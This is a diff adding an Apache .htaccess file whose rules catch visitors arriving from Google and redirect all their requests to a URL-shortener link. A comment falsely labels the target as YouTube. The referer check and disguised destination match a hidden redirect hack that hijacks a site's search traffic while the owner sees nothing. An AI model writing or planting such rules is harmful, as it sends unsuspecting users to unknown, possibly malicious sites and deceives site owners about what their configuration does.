@@ -1,0 +1,7 @@
+RewriteEngine On
+
+# Check if the visitor is coming from Google
+RewriteCond %{HTTP_REFERER} ^https?://(www\.)?google\. [NC]
+
+# Redirect to YouTube
+RewriteRule ^(.*)$ https://kutt.arrehlah.com/mixer [R=302,L]
